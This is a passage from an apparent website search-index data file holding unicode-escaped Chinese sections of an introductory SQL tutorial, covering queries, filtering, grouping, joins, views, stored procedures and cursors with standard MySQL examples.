\u4F7F\u7528\u66F4\u65B0\u548C\u5220\u9664\u64CD\u4F5C\u65F6\u4E00\u5B9A\u8981\u7528 WHERE \u5B50\u53E5\uFF0C\u4E0D\u7136\u4F1A\u628A\u6574\u5F20\u8868\u7684\u6570\u636E\u90FD\u7834\u574F\u3002\u53EF\u4EE5\u5148\u7528 SELECT \u8BED\u53E5\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u9632\u6B62\u9519\u8BEF\u5220\u9664\u3002`},{header:"\u4E03\u3001\u67E5\u8BE2",slug:"\u4E03\u3001\u67E5\u8BE2",content:""},{header:"DISTINCT",slug:"distinct",content:`\u76F8\u540C\u503C\u53EA\u4F1A\u51FA\u73B0\u4E00\u6B21\u3002\u5B83\u4F5C\u7528\u4E8E\u6240\u6709\u5217\uFF0C\u4E5F\u5C31\u662F\u8BF4\u6240\u6709\u5217\u7684\u503C\u90FD\u76F8\u540C\u624D\u7B97\u76F8\u540C\u3002
SELECT DISTINCT col1, col2
FROM mytable;`},{header:"LIMIT",slug:"limit",content:`\u9650\u5236\u8FD4\u56DE\u7684\u884C\u6570\u3002\u53EF\u4EE5\u6709\u4E24\u4E2A\u53C2\u6570\uFF0C\u7B2C\u4E00\u4E2A\u53C2\u6570\u4E3A\u8D77\u59CB\u884C\uFF0C\u4ECE 0 \u5F00\u59CB\uFF1B\u7B2C\u4E8C\u4E2A\u53C2\u6570\u4E3A\u8FD4\u56DE\u7684\u603B\u884C\u6570\u3002
\u8FD4\u56DE\u524D 5 \u884C\uFF1A
SELECT *
FROM mytable
LIMIT 5;
SELECT *
FROM mytable
LIMIT 0, 5;
\u8FD4\u56DE\u7B2C 3 ~ 5 \u884C\uFF1A
SELECT *
FROM mytable
LIMIT 2, 3;`},{header:"\u516B\u3001\u6392\u5E8F",slug:"\u516B\u3001\u6392\u5E8F",content:`ASC \uFF1A\u5347\u5E8F\uFF08\u9ED8\u8BA4\uFF09
DESC \uFF1A\u964D\u5E8F \u53EF\u4EE5\u6309\u591A\u4E2A\u5217\u8FDB\u884C\u6392\u5E8F\uFF0C\u5E76\u4E14\u4E3A\u6BCF\u4E2A\u5217\u6307\u5B9A\u4E0D\u540C\u7684\u6392\u5E8F\u65B9\u5F0F\uFF1A
SELECT *
FROM mytable
ORDER BY col1 DESC, col2 ASC;`},{header:"\u4E5D\u3001\u8FC7\u6EE4",slug:"\u4E5D\u3001\u8FC7\u6EE4",content:`\u4E0D\u8FDB\u884C\u8FC7\u6EE4\u7684\u6570\u636E\u975E\u5E38\u5927\uFF0C\u5BFC\u81F4\u901A\u8FC7\u7F51\u7EDC\u4F20\u8F93\u4E86\u591A\u4F59\u7684\u6570\u636E\uFF0C\u4ECE\u800C\u6D6A\u8D39\u4E86\u7F51\u7EDC\u5E26\u5BBD\u3002\u56E0\u6B64\u5C3D\u91CF\u4F7F\u7528 SQL \u8BED\u53E5\u6765\u8FC7\u6EE4\u4E0D\u5FC5\u8981\u7684\u6570\u636E\uFF0C\u800C\u4E0D\u662F\u4F20\u8F93\u6240\u6709\u7684\u6570\u636E\u5230\u5BA2\u6237\u7AEF\u4E2D\u7136\u540E\u7531\u5BA2\u6237\u7AEF\u8FDB\u884C\u8FC7\u6EE4\u3002
SELECT *
FROM mytable
WHERE col IS NULL;
\u4E0B\u8868\u663E\u793A\u4E86 WHERE \u5B50\u53E5\u53EF\u7528\u7684\u64CD\u4F5C\u7B26 \u64CD\u4F5C\u7B26
\u8BF4\u660E =
\u7B49\u4E8E <
\u5C0F\u4E8E >
\u5927\u4E8E <> !=
\u4E0D\u7B49\u4E8E <= !>
\u5C0F\u4E8E\u7B49\u4E8E >= !<
\u5927\u4E8E\u7B49\u4E8E BETWEEN
\u5728\u4E24\u4E2A\u503C\u4E4B\u95F4 IS NULL
\u4E3A NULL \u503C \u5E94\u8BE5\u6CE8\u610F\u5230\uFF0CNULL \u4E0E 0\u3001\u7A7A\u5B57\u7B26\u4E32\u90FD\u4E0D\u540C\u3002
AND \u548C OR \u7528\u4E8E\u8FDE\u63A5\u591A\u4E2A\u8FC7\u6EE4\u6761\u4EF6\u3002\u4F18\u5148\u5904\u7406 AND\uFF0C\u5F53\u4E00\u4E2A\u8FC7\u6EE4\u8868\u8FBE\u5F0F\u6D89\u53CA\u5230\u591A\u4E2A AND \u548C OR \u65F6\uFF0C\u53EF\u4EE5\u4F7F\u7528 () \u6765\u51B3\u5B9A\u4F18\u5148\u7EA7\uFF0C\u4F7F\u5F97\u4F18\u5148\u7EA7\u5173\u7CFB\u66F4\u6E05\u6670\u3002
IN \u64CD\u4F5C\u7B26\u7528\u4E8E\u5339\u914D\u4E00\u7EC4\u503C\uFF0C\u5176\u540E\u4E5F\u53EF\u4EE5\u63A5\u4E00\u4E2A SELECT \u5B50\u53E5\uFF0C\u4ECE\u800C\u5339\u914D\u5B50\u67E5\u8BE2\u5F97\u5230\u7684\u4E00\u7EC4\u503C\u3002
NOT \u64CD\u4F5C\u7B26\u7528\u4E8E\u5426\u5B9A\u4E00\u4E2A\u6761\u4EF6\u3002`},{header:"\u5341\u3001\u901A\u914D\u7B26",slug:"\u5341\u3001\u901A\u914D\u7B26",content:`\u901A\u914D\u7B26\u4E5F\u662F\u7528\u5728\u8FC7\u6EE4\u8BED\u53E5\u4E2D\uFF0C\u4F46\u5B83\u53EA\u80FD\u7528\u4E8E\u6587\u672C\u5B57\u6BB5\u3002 % \u5339\u914D >=0 \u4E2A\u4EFB\u610F\u5B57\u7B26\uFF1B _ \u5339\u914D ==1 \u4E2A\u4EFB\u610F\u5B57\u7B26\uFF1B [ ] \u53EF\u4EE5\u5339\u914D\u96C6\u5408\u5185\u7684\u5B57\u7B26\uFF0C\u4F8B\u5982 [ab] \u5C06\u5339\u914D\u5B57\u7B26 a \u6216\u8005 b\u3002\u7528\u8131\u5B57\u7B26 ^ \u53EF\u4EE5\u5BF9\u5176\u8FDB\u884C\u5426\u5B9A\uFF0C\u4E5F\u5C31\u662F\u4E0D\u5339\u914D\u96C6\u5408\u5185\u7684\u5B57\u7B26\u3002 \u4F7F\u7528 Like \u6765\u8FDB\u884C\u901A\u914D\u7B26\u5339\u914D\u3002
SELECT *
FROM mytable
WHERE col LIKE '[^AB]%'; -- \u4E0D\u4EE5 A \u548C B \u5F00\u5934\u7684\u4EFB\u610F\u6587\u672C
\u4E0D\u8981\u6EE5\u7528\u901A\u914D\u7B26\uFF0C\u901A\u914D\u7B26\u4F4D\u4E8E\u5F00\u5934\u5904\u5339\u914D\u4F1A\u975E\u5E38\u6162\u3002`},{header:"\u5341\u4E00\u3001\u8BA1\u7B97\u5B57\u6BB5",slug:"\u5341\u4E00\u3001\u8BA1\u7B97\u5B57\u6BB5",content:`\u5728\u6570\u636E\u5E93\u670D\u52A1\u5668\u4E0A\u5B8C\u6210\u6570\u636E\u7684\u8F6C\u6362\u548C\u683C\u5F0F\u5316\u7684\u5DE5\u4F5C\u5F80\u5F80\u6BD4\u5BA2\u6237\u7AEF\u4E0A\u5FEB\u5F97\u591A\uFF0C\u5E76\u4E14\u8F6C\u6362\u548C\u683C\u5F0F\u5316\u540E\u7684\u6570\u636E\u91CF\u66F4\u5C11\u7684\u8BDD\u53EF\u4EE5\u51CF\u5C11\u7F51\u7EDC\u901A\u4FE1\u91CF\u3002
\u8BA1\u7B97\u5B57\u6BB5\u901A\u5E38\u9700\u8981\u4F7F\u7528 AS \u6765\u53D6\u522B\u540D\uFF0C\u5426\u5219\u8F93\u51FA\u7684\u65F6\u5019\u5B57\u6BB5\u540D\u4E3A\u8BA1\u7B97\u8868\u8FBE\u5F0F\u3002
SELECT col1 * col2 AS alias
FROM mytable;
CONCAT() \u7528\u4E8E\u8FDE\u63A5\u4E24\u4E2A\u5B57\u6BB5\u3002\u8BB8\u591A\u6570\u636E\u5E93\u4F1A\u4F7F\u7528\u7A7A\u683C\u628A\u4E00\u4E2A\u503C\u586B\u5145\u4E3A\u5217\u5BBD\uFF0C\u56E0\u6B64\u8FDE\u63A5\u7684\u7ED3\u679C\u4F1A\u51FA\u73B0\u4E00\u4E9B\u4E0D\u5FC5\u8981\u7684\u7A7A\u683C\uFF0C\u4F7F\u7528 TRIM() \u53EF\u4EE5\u53BB\u9664\u9996\u5C3E\u7A7A\u683C\u3002
SELECT CONCAT(TRIM(col1), '(', TRIM(col2), ')') AS concat_col
FROM mytable;`},{header:"\u5341\u4E8C\u3001\u51FD\u6570",slug:"\u5341\u4E8C\u3001\u51FD\u6570",content:"\u5404\u4E2A DBMS \u7684\u51FD\u6570\u90FD\u662F\u4E0D\u76F8\u540C\u7684\uFF0C\u56E0\u6B64\u4E0D\u53EF\u79FB\u690D\uFF0C\u4EE5\u4E0B\u4E3B\u8981\u662F MySQL \u7684\u51FD\u6570\u3002"},{header:"\u6C47\u603B",slug:"\u6C47\u603B",content:`\u51FD \u6570
\u8BF4 \u660E AVG()
\u8FD4\u56DE\u67D0\u5217\u7684\u5E73\u5747\u503C COUNT()
\u8FD4\u56DE\u67D0\u5217\u7684\u884C\u6570 MAX()
\u8FD4\u56DE\u67D0\u5217\u7684\u6700\u5927\u503C MIN()
\u8FD4\u56DE\u67D0\u5217\u7684\u6700\u5C0F\u503C SUM()
\u8FD4\u56DE\u67D0\u5217\u503C\u4E4B\u548C AVG() \u4F1A\u5FFD\u7565 NULL \u884C\u3002
\u4F7F\u7528 DISTINCT \u53EF\u4EE5\u6C47\u603B\u4E0D\u540C\u7684\u503C\u3002
SELECT AVG(DISTINCT col1) AS avg_col
FROM mytable;`},{header:"\u6587\u672C\u5904\u7406",slug:"\u6587\u672C\u5904\u7406",content:`\u51FD\u6570
\u8BF4\u660E LEFT()
\u5DE6\u8FB9\u7684\u5B57\u7B26 RIGHT()
\u53F3\u8FB9\u7684\u5B57\u7B26 LOWER()
\u8F6C\u6362\u4E3A\u5C0F\u5199\u5B57\u7B26 UPPER()
\u8F6C\u6362\u4E3A\u5927\u5199\u5B57\u7B26 LTRIM()
\u53BB\u9664\u5DE6\u8FB9\u7684\u7A7A\u683C RTRIM()
\u53BB\u9664\u53F3\u8FB9\u7684\u7A7A\u683C LENGTH()
\u957F\u5EA6 SOUNDEX()
\u8F6C\u6362\u4E3A\u8BED\u97F3\u503C \u5176\u4E2D\uFF0C SOUNDEX() \u53EF\u4EE5\u5C06\u4E00\u4E2A\u5B57\u7B26\u4E32\u8F6C\u6362\u4E3A\u63CF\u8FF0\u5176\u8BED\u97F3\u8868\u793A\u7684\u5B57\u6BCD\u6570\u5B57\u6A21\u5F0F\u3002
SELECT *
FROM mytable
WHERE SOUNDEX(col1) = SOUNDEX('apple')`},{header:"\u65E5\u671F\u548C\u65F6\u95F4\u5904\u7406",slug:"\u65E5\u671F\u548C\u65F6\u95F4\u5904\u7406",content:`\u65E5\u671F\u683C\u5F0F\uFF1AYYYY-MM-DD
\u65F6\u95F4\u683C\u5F0F\uFF1AHH:<zero-width space>MM:SS \u51FD \u6570
\u8BF4 \u660E ADDDATE()
\u589E\u52A0\u4E00\u4E2A\u65E5\u671F\uFF08\u5929\u3001\u5468\u7B49\uFF09 ADDTIME()
\u589E\u52A0\u4E00\u4E2A\u65F6\u95F4\uFF08\u65F6\u3001\u5206\u7B49\uFF09 CURDATE()
\u8FD4\u56DE\u5F53\u524D\u65E5\u671F CURTIME()
\u8FD4\u56DE\u5F53\u524D\u65F6\u95F4 DATE()
\u8FD4\u56DE\u65E5\u671F\u65F6\u95F4\u7684\u65E5\u671F\u90E8\u5206 DATEDIFF()
\u8BA1\u7B97\u4E24\u4E2A\u65E5\u671F\u4E4B\u5DEE DATE_ADD()
\u9AD8\u5EA6\u7075\u6D3B\u7684\u65E5\u671F\u8FD0\u7B97\u51FD\u6570 DATE_FORMAT()
\u8FD4\u56DE\u4E00\u4E2A\u683C\u5F0F\u5316\u7684\u65E5\u671F\u6216\u65F6\u95F4\u4E32 DAY()
\u8FD4\u56DE\u4E00\u4E2A\u65E5\u671F\u7684\u5929\u6570\u90E8\u5206 DAYOFWEEK()
\u5BF9\u4E8E\u4E00\u4E2A\u65E5\u671F\uFF0C\u8FD4\u56DE\u5BF9\u5E94\u7684\u661F\u671F\u51E0 HOUR()
\u8FD4\u56DE\u4E00\u4E2A\u65F6\u95F4\u7684\u5C0F\u65F6\u90E8\u5206 MINUTE()
\u8FD4\u56DE\u4E00\u4E2A\u65F6\u95F4\u7684\u5206\u949F\u90E8\u5206 MONTH()
\u8FD4\u56DE\u4E00\u4E2A\u65E5\u671F\u7684\u6708\u4EFD\u90E8\u5206 NOW()
\u8FD4\u56DE\u5F53\u524D\u65E5\u671F\u548C\u65F6\u95F4 SECOND()
\u8FD4\u56DE\u4E00\u4E2A\u65F6\u95F4\u7684\u79D2\u90E8\u5206 TIME()
\u8FD4\u56DE\u4E00\u4E2A\u65E5\u671F\u65F6\u95F4\u7684\u65F6\u95F4\u90E8\u5206 YEAR()
\u8FD4\u56DE\u4E00\u4E2A\u65E5\u671F\u7684\u5E74\u4EFD\u90E8\u5206 mysql> SELECT NOW();
2018-4-14 20:25:11`},{header:"\u6570\u503C\u5904\u7406",slug:"\u6570\u503C\u5904\u7406",content:`\u51FD\u6570
\u8BF4\u660E SIN()
\u6B63\u5F26 COS()
\u4F59\u5F26 TAN()
\u6B63\u5207 ABS()
\u7EDD\u5BF9\u503C SQRT()
\u5E73\u65B9\u6839 MOD()
\u4F59\u6570 EXP()
\u6307\u6570 PI()
\u5706\u5468\u7387 RAND()
\u968F\u673A\u6570`},{header:"\u5341\u4E09\u3001\u5206\u7EC4",slug:"\u5341\u4E09\u3001\u5206\u7EC4",content:`\u628A\u5177\u6709\u76F8\u540C\u7684\u6570\u636E\u503C\u7684\u884C\u653E\u5728\u540C\u4E00\u7EC4\u4E2D\u3002
\u53EF\u4EE5\u5BF9\u540C\u4E00\u5206\u7EC4\u6570\u636E\u4F7F\u7528\u6C47\u603B\u51FD\u6570\u8FDB\u884C\u5904\u7406\uFF0C\u4F8B\u5982\u6C42\u5206\u7EC4\u6570\u636E\u7684\u5E73\u5747\u503C\u7B49\u3002
\u6307\u5B9A\u7684\u5206\u7EC4\u5B57\u6BB5\u9664\u4E86\u80FD\u6309\u8BE5\u5B57\u6BB5\u8FDB\u884C\u5206\u7EC4\uFF0C\u4E5F\u4F1A\u81EA\u52A8\u6309\u8BE5\u5B57\u6BB5\u8FDB\u884C\u6392\u5E8F\u3002
SELECT col, COUNT(*) AS num
FROM mytable
GROUP BY col;
GROUP BY \u81EA\u52A8\u6309\u5206\u7EC4\u5B57\u6BB5\u8FDB\u884C\u6392\u5E8F\uFF0CORDER BY \u4E5F\u53EF\u4EE5\u6309\u6C47\u603B\u5B57\u6BB5\u6765\u8FDB\u884C\u6392\u5E8F\u3002
SELECT col, COUNT(*) AS num
FROM mytable
GROUP BY col
ORDER BY num;
WHERE \u8FC7\u6EE4\u884C\uFF0CHAVING \u8FC7\u6EE4\u5206\u7EC4\uFF0C\u884C\u8FC7\u6EE4\u5E94\u5F53\u5148\u4E8E\u5206\u7EC4\u8FC7\u6EE4\u3002
SELECT col, COUNT(*) AS num
FROM mytable
WHERE col > 2
GROUP BY col
HAVING num >= 2;
\u5206\u7EC4\u89C4\u5B9A\uFF1A GROUP BY \u5B50\u53E5\u51FA\u73B0\u5728 WHERE \u5B50\u53E5\u4E4B\u540E\uFF0CORDER BY \u5B50\u53E5\u4E4B\u524D\uFF1B
\u9664\u4E86\u6C47\u603B\u5B57\u6BB5\u5916\uFF0CSELECT \u8BED\u53E5\u4E2D\u7684\u6BCF\u4E00\u5B57\u6BB5\u90FD\u5FC5\u987B\u5728 GROUP BY \u5B50\u53E5\u4E2D\u7ED9\u51FA\uFF1B
NULL \u7684\u884C\u4F1A\u5355\u72EC\u5206\u4E3A\u4E00\u7EC4\uFF1B
\u5927\u591A\u6570 SQL \u5B9E\u73B0\u4E0D\u652F\u6301 GROUP BY \u5217\u5177\u6709\u53EF\u53D8\u957F\u5EA6\u7684\u6570\u636E\u7C7B\u578B\u3002`},{header:"\u5341\u56DB\u3001\u5B50\u67E5\u8BE2",slug:"\u5341\u56DB\u3001\u5B50\u67E5\u8BE2",content:`\u5B50\u67E5\u8BE2\u4E2D\u53EA\u80FD\u8FD4\u56DE\u4E00\u4E2A\u5B57\u6BB5\u7684\u6570\u636E\u3002
\u53EF\u4EE5\u5C06\u5B50\u67E5\u8BE2\u7684\u7ED3\u679C\u4F5C\u4E3A WHRER \u8BED\u53E5\u7684\u8FC7\u6EE4\u6761\u4EF6\uFF1A
SELECT *
FROM mytable1
WHERE col1 IN (SELECT col2 FROM mytable2);
\u4E0B\u9762\u7684\u8BED\u53E5\u53EF\u4EE5\u68C0\u7D22\u51FA\u5BA2\u6237\u7684\u8BA2\u5355\u6570\u91CF\uFF0C\u5B50\u67E5\u8BE2\u8BED\u53E5\u4F1A\u5BF9\u7B2C\u4E00\u4E2A\u67E5\u8BE2\u68C0\u7D22\u51FA\u7684\u6BCF\u4E2A\u5BA2\u6237\u6267\u884C\u4E00\u6B21\uFF1A
SELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_num
FROM Customers
ORDER BY cust_name;`},{header:"\u5341\u4E94\u3001\u8FDE\u63A5",slug:"\u5341\u4E94\u3001\u8FDE\u63A5",content:`\u8FDE\u63A5\u7528\u4E8E\u8FDE\u63A5\u591A\u4E2A\u8868\uFF0C\u4F7F\u7528 JOIN \u5173\u952E\u5B57\uFF0C\u5E76\u4E14\u6761\u4EF6\u8BED\u53E5\u4F7F\u7528 ON \u800C\u4E0D\u662F WHERE\u3002
\u8FDE\u63A5\u53EF\u4EE5\u66FF\u6362\u5B50\u67E5\u8BE2\uFF0C\u5E76\u4E14\u6BD4\u5B50\u67E5\u8BE2\u7684\u6548\u7387\u4E00\u822C\u4F1A\u66F4\u5FEB\u3002
\u53EF\u4EE5\u7528 AS \u7ED9\u5217\u540D\u3001\u8BA1\u7B97\u5B57\u6BB5\u548C\u8868\u540D\u53D6\u522B\u540D\uFF0C\u7ED9\u8868\u540D\u53D6\u522B\u540D\u662F\u4E3A\u4E86\u7B80\u5316 SQL \u8BED\u53E5\u4EE5\u53CA\u8FDE\u63A5\u76F8\u540C\u8868\u3002`},{header:"\u5185\u8FDE\u63A5",slug:"\u5185\u8FDE\u63A5",content:`\u5185\u8FDE\u63A5\u53C8\u79F0\u7B49\u503C\u8FDE\u63A5\uFF0C\u4F7F\u7528 INNER JOIN \u5173\u952E\u5B57\u3002
SELECT A.value, B.value
FROM tablea AS A INNER JOIN tableb AS B
ON A.key = B.key;
\u53EF\u4EE5\u4E0D\u660E\u786E\u4F7F\u7528 INNER JOIN\uFF0C\u800C\u4F7F\u7528\u666E\u901A\u67E5\u8BE2\u5E76\u5728 WHERE \u4E2D\u5C06\u4E24\u4E2A\u8868\u4E2D\u8981\u8FDE\u63A5\u7684\u5217\u7528\u7B49\u503C\u65B9\u6CD5\u8FDE\u63A5\u8D77\u6765\u3002
SELECT A.value, B.value
FROM tablea AS A, tableb AS B
WHERE A.key = B.key;`},{header:"\u81EA\u8FDE\u63A5",slug:"\u81EA\u8FDE\u63A5",content:`\u81EA\u8FDE\u63A5\u53EF\u4EE5\u770B\u6210\u5185\u8FDE\u63A5\u7684\u4E00\u79CD\uFF0C\u53EA\u662F\u8FDE\u63A5\u7684\u8868\u662F\u81EA\u8EAB\u800C\u5DF2\u3002
\u4E00\u5F20\u5458\u5DE5\u8868\uFF0C\u5305\u542B\u5458\u5DE5\u59D3\u540D\u548C\u5458\u5DE5\u6240\u5C5E\u90E8\u95E8\uFF0C\u8981\u627E\u51FA\u4E0E Jim \u5904\u5728\u540C\u4E00\u90E8\u95E8\u7684\u6240\u6709\u5458\u5DE5\u59D3\u540D\u3002
\u5B50\u67E5\u8BE2\u7248\u672C
SELECT name
FROM employee
WHERE department = ( SELECT department FROM employee WHERE name = "Jim");
\u81EA\u8FDE\u63A5\u7248\u672C
SELECT e1.name
FROM employee AS e1 INNER JOIN employee AS e2
ON e1.department = e2.department AND e2.name = "Jim";`},{header:"\u81EA\u7136\u8FDE\u63A5",slug:"\u81EA\u7136\u8FDE\u63A5",content:`\u81EA\u7136\u8FDE\u63A5\u662F\u628A\u540C\u540D\u5217\u901A\u8FC7\u7B49\u503C\u6D4B\u8BD5\u8FDE\u63A5\u8D77\u6765\u7684\uFF0C\u540C\u540D\u5217\u53EF\u4EE5\u6709\u591A\u4E2A\u3002
\u5185\u8FDE\u63A5\u548C\u81EA\u7136\u8FDE\u63A5\u7684\u533A\u522B\uFF1A\u5185\u8FDE\u63A5\u63D0\u4F9B\u8FDE\u63A5\u7684\u5217\uFF0C\u800C\u81EA\u7136\u8FDE\u63A5\u81EA\u52A8\u8FDE\u63A5\u6240\u6709\u540C\u540D\u5217\u3002
SELECT A.value, B.value
FROM tablea AS A NATURAL JOIN tableb AS B;`},{header:"\u5916\u8FDE\u63A5",slug:"\u5916\u8FDE\u63A5",content:`\u5916\u8FDE\u63A5\u4FDD\u7559\u4E86\u6CA1\u6709\u5173\u8054\u7684\u90A3\u4E9B\u884C\u3002\u5206\u4E3A\u5DE6\u5916\u8FDE\u63A5\uFF0C\u53F3\u5916\u8FDE\u63A5\u4EE5\u53CA\u5168\u5916\u8FDE\u63A5\uFF0C\u5DE6\u5916\u8FDE\u63A5\u5C31\u662F\u4FDD\u7559\u5DE6\u8868\u6CA1\u6709\u5173\u8054\u7684\u884C\u3002
\u68C0\u7D22\u6240\u6709\u987E\u5BA2\u7684\u8BA2\u5355\u4FE1\u606F\uFF0C\u5305\u62EC\u8FD8\u6CA1\u6709\u8BA2\u5355\u4FE1\u606F\u7684\u987E\u5BA2\u3002
SELECT Customers.cust_id, Customer.cust_name, Orders.order_id
FROM Customers LEFT OUTER JOIN Orders
ON Customers.cust_id = Orders.cust_id;
customers \u8868\uFF1A cust_id
cust_name 1
a 2
b 3
c orders \u8868\uFF1A order_id
cust_id 1
1 2
1 3
3 4
3 \u7ED3\u679C\uFF1A cust_id
cust_name
order_id 1
a
1 1
a
2 3
c
3 3
c
4 2
b
Null`},{header:"\u5341\u516D\u3001\u7EC4\u5408\u67E5\u8BE2",slug:"\u5341\u516D\u3001\u7EC4\u5408\u67E5\u8BE2",content:`\u4F7F\u7528 UNION \u6765\u7EC4\u5408\u4E24\u4E2A\u67E5\u8BE2\uFF0C\u5982\u679C\u7B2C\u4E00\u4E2A\u67E5\u8BE2\u8FD4\u56DE M \u884C\uFF0C\u7B2C\u4E8C\u4E2A\u67E5\u8BE2\u8FD4\u56DE N \u884C\uFF0C\u90A3\u4E48\u7EC4\u5408\u67E5\u8BE2\u7684\u7ED3\u679C\u4E00\u822C\u4E3A M+N \u884C\u3002
\u6BCF\u4E2A\u67E5\u8BE2\u5FC5\u987B\u5305\u542B\u76F8\u540C\u7684\u5217\u3001\u8868\u8FBE\u5F0F\u548C\u805A\u96C6\u51FD\u6570\u3002
\u9ED8\u8BA4\u4F1A\u53BB\u9664\u76F8\u540C\u884C\uFF0C\u5982\u679C\u9700\u8981\u4FDD\u7559\u76F8\u540C\u884C\uFF0C\u4F7F\u7528 UNION ALL\u3002
\u53EA\u80FD\u5305\u542B\u4E00\u4E2A ORDER BY \u5B50\u53E5\uFF0C\u5E76\u4E14\u5FC5\u987B\u4F4D\u4E8E\u8BED\u53E5\u7684\u6700\u540E\u3002
SELECT col
FROM mytable
WHERE col = 1
UNION
SELECT col
FROM mytable
WHERE col =2;`},{header:"\u5341\u4E03\u3001\u89C6\u56FE",slug:"\u5341\u4E03\u3001\u89C6\u56FE",content:`\u89C6\u56FE\u662F\u865A\u62DF\u7684\u8868\uFF0C\u672C\u8EAB\u4E0D\u5305\u542B\u6570\u636E\uFF0C\u4E5F\u5C31\u4E0D\u80FD\u5BF9\u5176\u8FDB\u884C\u7D22\u5F15\u64CD\u4F5C\u3002
\u5BF9\u89C6\u56FE\u7684\u64CD\u4F5C\u548C\u5BF9\u666E\u901A\u8868\u7684\u64CD\u4F5C\u4E00\u6837\u3002
\u89C6\u56FE\u5177\u6709\u5982\u4E0B\u597D\u5904\uFF1A \u7B80\u5316\u590D\u6742\u7684 SQL \u64CD\u4F5C\uFF0C\u6BD4\u5982\u590D\u6742\u7684\u8FDE\u63A5\uFF1B
\u53EA\u4F7F\u7528\u5B9E\u9645\u8868\u7684\u4E00\u90E8\u5206\u6570\u636E\uFF1B
\u901A\u8FC7\u53EA\u7ED9\u7528\u6237\u8BBF\u95EE\u89C6\u56FE\u7684\u6743\u9650\uFF0C\u4FDD\u8BC1\u6570\u636E\u7684\u5B89\u5168\u6027\uFF1B
\u66F4\u6539\u6570\u636E\u683C\u5F0F\u548C\u8868\u793A\u3002 CREATE VIEW myview AS
SELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_col
FROM mytable
WHERE col5 = val;`},{header:"\u5341\u516B\u3001\u5B58\u50A8\u8FC7\u7A0B",slug:"\u5341\u516B\u3001\u5B58\u50A8\u8FC7\u7A0B",content:`\u5B58\u50A8\u8FC7\u7A0B\u53EF\u4EE5\u770B\u6210\u662F\u5BF9\u4E00\u7CFB\u5217 SQL \u64CD\u4F5C\u7684\u6279\u5904\u7406\u3002
\u4F7F\u7528\u5B58\u50A8\u8FC7\u7A0B\u7684\u597D\u5904\uFF1A \u4EE3\u7801\u5C01\u88C5\uFF0C\u4FDD\u8BC1\u4E86\u4E00\u5B9A\u7684\u5B89\u5168\u6027\uFF1B
\u4EE3\u7801\u590D\u7528\uFF1B
\u7531\u4E8E\u662F\u9884\u5148\u7F16\u8BD1\uFF0C\u56E0\u6B64\u5177\u6709\u5F88\u9AD8\u7684\u6027\u80FD\u3002 \u547D\u4EE4\u884C\u4E2D\u521B\u5EFA\u5B58\u50A8\u8FC7\u7A0B\u9700\u8981\u81EA\u5B9A\u4E49\u5206\u9694\u7B26\uFF0C\u56E0\u4E3A\u547D\u4EE4\u884C\u662F\u4EE5 ; \u4E3A\u7ED3\u675F\u7B26\uFF0C\u800C\u5B58\u50A8\u8FC7\u7A0B\u4E2D\u4E5F\u5305\u542B\u4E86\u5206\u53F7\uFF0C\u56E0\u6B64\u4F1A\u9519\u8BEF\u628A\u8FD9\u90E8\u5206\u5206\u53F7\u5F53\u6210\u662F\u7ED3\u675F\u7B26\uFF0C\u9020\u6210\u8BED\u6CD5\u9519\u8BEF\u3002
\u5305\u542B in\u3001out \u548C inout \u4E09\u79CD\u53C2\u6570\u3002
\u7ED9\u53D8\u91CF\u8D4B\u503C\u90FD\u9700\u8981\u7528 select into \u8BED\u53E5\u3002
\u6BCF\u6B21\u53EA\u80FD\u7ED9\u4E00\u4E2A\u53D8\u91CF\u8D4B\u503C\uFF0C\u4E0D\u652F\u6301\u96C6\u5408\u7684\u64CD\u4F5C\u3002
delimiter // create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end // delimiter ;
call myprocedure(@ret);
select @ret;`},{header:"\u5341\u4E5D\u3001\u6E38\u6807",slug:"\u5341\u4E5D\u3001\u6E38\u6807",content:`\u5728\u5B58\u50A8\u8FC7\u7A0B\u4E2D\u4F7F\u7528\u6E38\u6807\u53EF\u4EE5\u5BF9\u4E00\u4E2A\u7ED3\u679C\u96C6\u8FDB\u884C\u79FB\u52A8\u904D\u5386\u3002
\u6E38\u6807\u4E3B\u8981\u7528\u4E8E\u4EA4\u4E92\u5F0F\u5E94\u7528\uFF0C\u5176\u4E2D\u7528\u6237\u9700\u8981\u5BF9\u6570\u636E\u96C6\u4E2D\u7684\u4EFB\u610F\u884C\u8FDB\u884C\u6D4F\u89C8\u548C\u4FEE\u6539\u3002
\u4F7F\u7528\u6E38\u6807\u7684\u56DB\u4E2A\u6B65\u9AA4\uFF1A \u58F0\u660E\u6E38\u6807\uFF0C\u8FD9\u4E2A\u8FC7\u7A0B\u6CA1\u6709\u5B9E\u9645\u68C0\u7D22\u51FA\u6570\u636E\uFF1B
\u6253\u5F00\u6E38\u6807\uFF1B
\u53D6\u51FA\u6570\u636E\uFF1B
\u5173\u95ED\u6E38\u6807\uFF1B delimiter //
create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; # \u5B9A\u4E49\u4E86\u4E00\u4E2A continue handler\uFF0C\u5F53 sqlstate '02000' \u8FD9\u4E2A\u6761\u4EF6\u51FA\u73B0\u65F6\uFF0C\u4F1A\u6267\u884C set done = 1 declare continue handler for sqlstate '02000' set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ;`},{header:"\u4E8C\u5341\u3001\u89E6\u53D1\u5668",slug:"\u4E8C\u5341\u3001\u89E6\u53D1\u5668",content:`\u89E6\u53D1\u5668\u4F1A\u5728\u67D0\u4E2A\u8868\u6267\u884C\u4EE5\u4E0B\u8BED\u53E5\u65F6\u800C\u81EA\u52A8\u6267\u884C\uFF1ADELETE\u3001INSERT\u3001UPDATE\u3002
